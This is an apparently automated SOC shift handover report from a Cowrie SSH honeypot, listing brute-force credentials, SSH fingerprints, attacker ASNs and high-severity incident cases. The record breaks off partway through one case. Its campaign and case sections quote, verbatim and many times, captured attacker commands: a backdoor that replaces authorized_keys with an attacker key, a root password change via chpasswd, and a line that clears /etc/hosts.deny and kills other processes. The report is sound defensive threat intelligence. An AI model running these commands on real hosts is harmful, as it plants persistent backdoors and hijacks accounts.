# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-23 |
| **Generated At** | 2026-05-23T22:57:37Z |
| **Shift Time** | 22:57 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **217** |
| Confirmed Threats | **149** |
| False Positives Filtered | **68** (31.3%) |
| Unique Attacker IPs | **41** |
| Countries of Origin | **22** |
| High Severity Cases | **28** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **189** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **78** |
| Unique Credential Pairs | **53** |
| Unique Usernames | **35** |
| Unique Passwords | **44** |
| Successful Auth Pairs | **21** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 28 |
| `345gs5662d34` | 12 |
| `user` | 3 |
| `root/1234567` | 2 |
| `liyang` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 13 |
| `345gs5662d34` | 12 |
| `123456` | 9 |
| `123` | 3 |
| `Admin@123` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 13 |
| `345gs5662d34` | `345gs5662d34` | 12 |
| `root/1234567` | `123456` | 2 |
| `liyang` | `123456` | 2 |
| `api` | `api123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | ` ` | `43.226.39.177` | 2026-05-23T21:13:32 |
| `root` | `mohammad` | `180.167.207.234` | 2026-05-23T21:18:41 |
| `root` | `3245gs5662d34` | `180.167.207.234` | 2026-05-23T21:18:49 |
| `root` | `Redhat123` | `180.167.207.234` | 2026-05-23T21:19:59 |
| `root` | `moon` | `180.167.207.234` | 2026-05-23T21:21:12 |
| `root` | `Server@123` | `113.108.13.168` | 2026-05-23T21:30:40 |
| `root` | `3245gs5662d34` | `113.108.13.168` | 2026-05-23T21:30:43 |
| `root` | `Centos123` | `186.22.19.183` | 2026-05-23T21:43:09 |
| `root` | `3245gs5662d34` | `186.22.19.183` | 2026-05-23T21:43:17 |
| `root` | `admin1234` | `102.23.122.235` | 2026-05-23T21:59:53 |
| `root` | `3245gs5662d34` | `102.23.122.235` | 2026-05-23T22:00:00 |
| `root` | `aa147258` | `197.227.14.33` | 2026-05-23T22:08:33 |
| `root` | `3245gs5662d34` | `197.227.14.33` | 2026-05-23T22:08:41 |
| `root` | `1234Asdf` | `102.23.122.235` | 2026-05-23T22:09:00 |
| `root` | `qweasd1234` | `102.23.122.235` | 2026-05-23T22:18:13 |
| `root` | `Qazwsx123!@#` | `197.227.14.33` | 2026-05-23T22:28:40 |
| `root` | `azer1234` | `102.23.122.235` | 2026-05-23T22:31:51 |
| `root` | `ali123` | `197.227.14.33` | 2026-05-23T22:40:25 |
| `root` | `123qwe!!!` | `197.227.14.33` | 2026-05-23T22:53:19 |
| `root` | `dp123456.` | `172.174.5.146` | 2026-05-23T22:55:43 |
| `root` | `3245gs5662d34` | `172.174.5.146` | 2026-05-23T22:55:48 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **217** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 90 |
| Perl Net::SSH | 1 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 43 | 4 |
| `03a80b21afa8...` | Modern SSH client | 37 | 5 |
| `af8223ac9914...` | libssh-based | 8 | 1 |
| `3c0eaacec19b...` | Mirai/variant | 1 | 1 |
| `4e066189c3bb...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 43 | 4 | Mirai/variant |
| `03a80b21afa8...` | libssh | 37 | 5 | Modern SSH client |
| `af8223ac9914...` | libssh | 8 | 1 | libssh-based |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `3c0eaacec19b...` | Perl Net::SSH | 1 | 1 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 13 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:OyrksKLd5YPk"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `180.167.207.234`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `102.23.122.235`, `180.167.207.234`, `197.227.14.33`, `172.174.5.146`, `186.22.19.183`, `113.108.13.168`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **41** |
| Unique ASNs | **35** |
| High-Risk ASNs | **20** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS213412` | ONYPHE SAS | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS11664` | Techtel LMDS Comunicaciones Interactivas S.A. | 2 | HIGH |
| `AS21003` | General Post and Telecommunication Company (GPTC) | 2 | LOW |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS23724` | IDC, China Telecommunications Corporation | 1 | HIGH |
| `AS28573` | Claro NXT Telecomunicacoes Ltda | 1 | LOW |
| `AS27747` | Telecentro S.A. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (28)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-fb031c744d51

| Field | Detail |
|---|---|
| **Source IP** | `43.226.39[.]177` |
| **First Seen** | 2026-05-23 21:12 |
| **Last Seen** | 2026-05-23 21:13 |
| **Session Duration** | 66s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 21:12:25` | `cowrie.session.connect` |
| `2026-05-23 21:12:25` | `cowrie.client.version` |
| `2026-05-23 21:13:30` | `cowrie.client.kex` |
| `2026-05-23 21:13:32` | `cowrie.login.success` |
| `2026-05-23 21:13:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.226.39[.]177` to AbuseIPDB if not already reported
- [ ] Block `43.226.39[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a10f550436a0

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-23 21:18 |
| **Last Seen** | 2026-05-23 21:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 21:18:41` | `cowrie.session.connect` |
| `2026-05-23 21:18:41` | `cowrie.client.version` |
| `2026-05-23 21:18:41` | `cowrie.client.kex` |
| `2026-05-23 21:18:41` | `cowrie.login.success` |
| `2026-05-23 21:18:42` | `cowrie.session.params` |
| `2026-05-23 21:18:42` | `cowrie.command.input` |
| `2026-05-23 21:18:42` | `cowrie.command.failed` |
| `2026-05-23 21:18:42` | `cowrie.log.closed` |
| `2026-05-23 21:18:42` | `cowrie.session.params` |
| `2026-05-23 21:18:42` | `cowrie.command.input` |
| `2026-05-23 21:18:43` | `cowrie.session.file_download` |
| `2026-05-23 21:18:43` | `cowrie.log.closed` |
| `2026-05-23 21:18:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b06f91382ef9

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-23 21:18 |
| **Last Seen** | 2026-05-23 21:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 21:18:49` | `cowrie.session.connect` |
| `2026-05-23 21:18:49` | `cowrie.client.version` |
| `2026-05-23 21:18:49` | `cowrie.client.kex` |
| `2026-05-23 21:18:49` | `cowrie.login.success` |
| `2026-05-23 21:18:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c31a072487b

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-23 21:19 |
| **Last Seen** | 2026-05-23 21:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 21:19:58` | `cowrie.session.connect` |
| `2026-05-23 21:19:58` | `cowrie.client.version` |
| `2026-05-23 21:19:59` | `cowrie.client.kex` |
| `2026-05-23 21:19:59` | `cowrie.login.success` |
| `2026-05-23 21:20:00` | `cowrie.session.params` |
| `2026-05-23 21:20:00` | `cowrie.command.input` |
| `2026-05-23 21:20:00` | `cowrie.command.failed` |
| `2026-05-23 21:20:00` | `cowrie.log.closed` |
| `2026-05-23 21:20:00` | `cowrie.session.params` |
| `2026-05-23 21:20:00` | `cowrie.command.input` |
| `2026-05-23 21:20:00` | `cowrie.session.file_download` |
| `2026-05-23 21:20:00` | `cowrie.log.closed` |
| `2026-05-23 21:20:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20e4f70775c1

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-23 21:20 |
| **Last Seen** | 2026-05-23 21:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 21:20:03` | `cowrie.session.connect` |
| `2026-05-23 21:20:03` | `cowrie.client.version` |
| `2026-05-23 21:20:03` | `cowrie.client.kex` |
| `2026-05-23 21:20:03` | `cowrie.login.success` |
| `2026-05-23 21:20:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b855a81fa57

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-23 21:21 |
| **Last Seen** | 2026-05-23 21:21 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:OyrksKLd5YPk"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 21:21:12` | `cowrie.session.connect` |
| `2026-05-23 21:21:12` | `cowrie.client.version` |
| `2026-05-23 21:21:12` | `cowrie.client.kex` |
| `2026-05-23 21:21:12` | `cowrie.login.success` |
| `2026-05-23 21:21:13` | `cowrie.session.params` |
| `2026-05-23 21:21:13` | `cowrie.command.input` |
| `2026-05-23 21:21:13` | `cowrie.command.failed` |
| `2026-05-23 21:21:13` | `cowrie.log.closed` |
| `2026-05-23 21:21:13` | `cowrie.session.params` |
| `2026-05-23 21:21:13` | `cowrie.command.input` |
| `2026-05-23 21:21:13` | `cowrie.session.file_download` |
| `2026-05-23 21:21:13` | `cowrie.log.closed` |
| `2026-05-23 21:21:26` | `cowrie.session.params` |
| `2026-05-23 21:21:26` | `cowrie.command.input` |
| `2026-05-23 21:21:26` | `cowrie.log.closed` |
| `2026-05-23 21:21:26` | `cowrie.session.params` |
| `2026-05-23 21:21:26` | `cowrie.command.input` |
| `2026-05-23 21:21:26` | `cowrie.log.closed` |
| `2026-05-23 21:21:27` | `cowrie.session.params` |
| `2026-05-23 21:21:27` | `cowrie.command.input` |
| `2026-05-23 21:21:27` | `cowrie.session.file_download` |
| `2026-05-23 21:21:27` | `cowrie.log.closed` |
| `2026-05-23 21:21:27` | `cowrie.session.params` |
| `2026-05-23 21:21:27` | `cowrie.command.input` |
| `2026-05-23 21:21:27` | `cowrie.log.closed` |
| `2026-05-23 21:21:28` | `cowrie.session.params` |
| `2026-05-23 21:21:28` | `cowrie.command.input` |
| `2026-05-23 21:21:28` | `cowrie.log.closed` |
| `2026-05-23 21:21:28` | `cowrie.session.params` |
| `2026-05-23 21:21:28` | `cowrie.command.input` |
| `2026-05-23 21:21:28` | `cowrie.command.input` |
| `2026-05-23 21:21:29` | `cowrie.log.closed` |
| `2026-05-23 21:21:29` | `cowrie.session.params` |
| `2026-05-23 21:21:29` | `cowrie.command.input` |
| `2026-05-23 21:21:29` | `cowrie.log.closed` |
| `2026-05-23 21:21:29` | `cowrie.session.params` |
| `2026-05-23 21:21:29` | `cowrie.command.input` |
| `2026-05-23 21:21:30` | `cowrie.log.closed` |
| `2026-05-23 21:21:30` | `cowrie.session.params` |
| `2026-05-23 21:21:30` | `cowrie.command.input` |
| `2026-05-23 21:21:30` | `cowrie.log.closed` |
| `2026-05-23 21:21:31` | `cowrie.session.params` |
| `2026-05-23 21:21:31` | `cowrie.command.input` |
| `2026-05-23 21:21:31` | `cowrie.log.closed` |
| `2026-05-23 21:21:31` | `cowrie.session.params` |
| `2026-05-23 21:21:31` | `cowrie.command.input` |
| `2026-05-23 21:21:31` | `cowrie.log.closed` |
| `2026-05-23 21:21:32` | `cowrie.session.params` |
| `2026-05-23 21:21:32` | `cowrie.command.input` |
| `2026-05-23 21:21:32` | `cowrie.log.closed` |
| `2026-05-23 21:21:32` | `cowrie.session.params` |
| `2026-05-23 21:21:32` | `cowrie.command.input` |
| `2026-05-23 21:21:32` | `cowrie.log.closed` |
| `2026-05-23 21:21:33` | `cowrie.session.params` |
| `2026-05-23 21:21:33` | `cowrie.command.input` |
| `2026-05-23 21:21:33` | `cowrie.log.closed` |
| `2026-05-23 21:21:33` | `cowrie.session.params` |
| `2026-05-23 21:21:33` | `cowrie.command.input` |
| `2026-05-23 21:21:33` | `cowrie.log.closed` |
| `2026-05-23 21:21:34` | `cowrie.session.params` |
| `2026-05-23 21:21:34` | `cowrie.command.input` |
| `2026-05-23 21:21:34` | `cowrie.log.closed` |
| `2026-05-23 21:21:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-054c11314c52

| Field | Detail |
|---|---|
| **Source IP** | `113.108.13[.]168` |
| **First Seen** | 2026-05-23 21:30 |
| **Last Seen** | 2026-05-23 21:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 21:30:39` | `cowrie.session.connect` |
| `2026-05-23 21:30:39` | `cowrie.client.version` |
| `2026-05-23 21:30:39` | `cowrie.client.kex` |
| `2026-05-23 21:30:40` | `cowrie.login.success` |
| `2026-05-23 21:30:40` | `cowrie.session.params` |
| `2026-05-23 21:30:40` | `cowrie.command.input` |
| `2026-05-23 21:30:40` | `cowrie.command.failed` |
| `2026-05-23 21:30:40` | `cowrie.log.closed` |
| `2026-05-23 21:30:41` | `cowrie.session.params` |
| `2026-05-23 21:30:41` | `cowrie.command.input` |
| `2026-05-23 21:30:41` | `cowrie.session.file_download` |
| `2026-05-23 21:30:41` | `cowrie.log.closed` |
| `2026-05-23 21:30:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.108.13[.]168` to AbuseIPDB if not already reported
- [ ] Block `113.108.13[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-911c8fd3505d

| Field | Detail |
|---|---|
| **Source IP** | `113.108.13[.]168` |
| **First Seen** | 2026-05-23 21:30 |
| **Last Seen** | 2026-05-23 21:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 21:30:43` | `cowrie.session.connect` |
| `2026-05-23 21:30:43` | `cowrie.client.version` |
| `2026-05-23 21:30:43` | `cowrie.client.kex` |
| `2026-05-23 21:30:43` | `cowrie.login.success` |
| `2026-05-23 21:30:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.108.13[.]168` to AbuseIPDB if not already reported
- [ ] Block `113.108.13[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2647a39ab952

| Field | Detail |
|---|---|
| **Source IP** | `186.22.19[.]183` |
| **First Seen** | 2026-05-23 21:43 |
| **Last Seen** | 2026-05-23 21:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 21:43:07` | `cowrie.session.connect` |
| `2026-05-23 21:43:07` | `cowrie.client.version` |
| `2026-05-23 21:43:08` | `cowrie.client.kex` |
| `2026-05-23 21:43:09` | `cowrie.login.success` |
| `2026-05-23 21:43:10` | `cowrie.session.params` |
| `2026-05-23 21:43:10` | `cowrie.command.input` |
| `2026-05-23 21:43:10` | `cowrie.command.failed` |
| `2026-05-23 21:43:10` | `cowrie.log.closed` |
| `2026-05-23 21:43:11` | `cowrie.session.params` |
| `2026-05-23 21:43:11` | `cowrie.command.input` |
| `2026-05-23 21:43:11` | `cowrie.session.file_download` |
| `2026-05-23 21:43:11` | `cowrie.log.closed` |
| `2026-05-23 21:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.22.19[.]183` to AbuseIPDB if not already reported
- [ ] Block `186.22.19[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afbd2f145e3e

| Field | Detail |
|---|---|
| **Source IP** | `186.22.19[.]183` |
| **First Seen** | 2026-05-23 21:43 |
| **Last Seen** | 2026-05-23 21:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 21:43:15` | `cowrie.session.connect` |
| `2026-05-23 21:43:15` | `cowrie.client.version` |
| `2026-05-23 21:43:15` | `cowrie.client.kex` |
| `2026-05-23 21:43:17` | `cowrie.login.success` |
| `2026-05-23 21:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.22.19[.]183` to AbuseIPDB if not already reported
- [ ] Block `186.22.19[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c2107a01768

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-05-23 21:59 |
| **Last Seen** | 2026-05-23 22:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
